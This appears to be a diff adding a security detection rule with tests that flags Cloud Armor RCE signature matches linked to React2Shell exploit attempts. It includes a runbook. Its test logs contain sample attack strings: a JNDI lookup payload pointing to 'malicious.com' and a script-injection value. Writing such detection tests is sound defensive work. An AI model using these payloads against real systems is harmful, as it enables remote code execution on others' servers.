@@ -1,0 +1,132 @@
+AnalysisType: rule
+Description: >
+  Detects when GCP Cloud Armor detects HTTP requests matching specific Remote Code Execution (RCE)
+  vulnerability signatures (google-mrs-v202512-id000001-rce and google-mrs-v202512-id000002-rce) which match React2Shell exploit attempts.
+  These rules indicate active exploitation attempts against known RCE vulnerabilities.
+DisplayName: GCP Cloud Armor RCE Attempt Detected
+Enabled: true
+Filename: gcp_cloud_armor_r2s_rce_attempt.py
+RuleID: GCP.CloudArmor.React2Shell.RCE.Attempt
+Severity: High
+LogTypes:
+  - GCP.HTTPLoadBalancer
+Tags:
+  - GCP
+  - Cloud Armor
+  - WAF
+  - RCE
+  - React2Shell
+Reference: https://cloud.google.com/armor/docs/waf-rules#cves_and_other_vulnerabilities
+Runbook: |
+  1. Query GCP HTTP Load Balancer logs for all requests from the httpRequest:remoteIp in the 6 hours before and after the alert to identify attack patterns and other exploit attempts
+  2. Check if the httpRequest:remoteIp is associated with known threat actors, scanning infrastructure, VPN services, or proxy networks using IP enrichment
+  3. Search for other Cloud Armor denials (jsonPayload:statusDetails = denied_by_security_policy) from this IP or targeting the same resource:labels:backend_service_name in the past 7 days to assess campaign scope
+Tests:
+  - Name: Enforced blocks signature 1
+    ExpectedResult: true
+    Log:
+      httpRequest:
+        remoteIp: 1.2.3.4
+        requestMethod: POST
+        requestUrl: https://example.com/api/upload
+        requestSize: 1024
+        responseSize: 0
+        status: 403
+        userAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      insertId: abc123xyz
+      jsonPayload:
+        statusDetails: denied_by_security_policy
+        enforcedSecurityPolicy:
+          name: cloud-armor-policy-prod
+          configuredAction: DENY
+          outcome: DENY
+          priority: 10000
+          preconfiguredExprIds:
+            - google-mrs-v202512-id000001-rce
+          matchedFieldType: COOKIE_VALUES
+          matchedFieldName: session
+          matchedFieldValue: ${jndi:ldap://malicious.com/exploit}
+          matchedLength: 42
+      logName: projects/test-project/logs/requests
+      resource:
+        type: http_load_balancer
+        labels:
+          project_id: test-project
+          backend_service_name: web-backend
+          forwarding_rule_name: web-lb-rule
+      severity: WARNING
+      timestamp: "2025-12-16 10:30:00.000"
+  - Name: Enforced blocks signature 2
+    ExpectedResult: true
+    Log:
+      httpRequest:
+        remoteIp: 1.2.3.4
+        requestMethod: GET
+        requestUrl: https://example.com/search?q=malicious
+        status: 403
+        userAgent: python-requests/2.28.0
+      insertId: def456uvw
+      jsonPayload:
+        statusDetails: denied_by_security_policy
+        enforcedSecurityPolicy:
+          configuredAction: DENY
+          outcome: DENY
+          priority: 10000
+          preconfiguredExprIds:
+            - google-mrs-v202512-id000002-rce
+          matchedFieldType: QUERY_PARAMS
+          matchedFieldName: q
+          matchedFieldValue: <script>eval()</script>
+          matchedLength: 22
+      logName: projects/test-project/logs/requests
+      resource:
+        type: http_load_balancer
+        labels:
+          project_id: test-project
+          backend_service_name: api-backend
+      severity: WARNING
+  - Name: Preview detects signature 1
+    ExpectedResult: true
+    Log:
+      httpRequest:
+        remoteIp: 1.2.3.4
+        requestMethod: POST
+        requestUrl: https://example.com/api/data
+        status: 200
+      insertId: preview789xyz
+      jsonPayload:
+        statusDetails: response_sent_by_backend
+        enforcedSecurityPolicy:
+          configuredAction: ALLOW
+          outcome: ACCEPT
+          priority: 2147483647
+        previewSecurityPolicy:
+          configuredAction: DENY
+          outcome: DENY
+          priority: 10000
+          preconfiguredExprIds:
+            - google-mrs-v202512-id000001-rce
+          matchedFieldType: ARG_VALUES
+          matchedFieldName: data
+      resource:
+        type: http_load_balancer
+        labels:
+          project_id: test-project
+      timestamp: "2025-12-16 11:00:00.000"
+  - Name: Other event
+    ExpectedResult: false
+    Log:
+      httpRequest:
+        remoteIp: 1.2.3.4
+        requestMethod: GET
+        status: 403
+      insertId: vwx678yza
+      jsonPayload:
+        statusDetails: denied_by_security_policy
+        enforcedSecurityPolicy:
+          outcome: DENY
+          preconfiguredExprIds:
+            - owasp-crs-v030301-id941320-xss
+      resource:
+        type: gce_instance
+      timestamp: "2025-12-16 10:55:00.000"
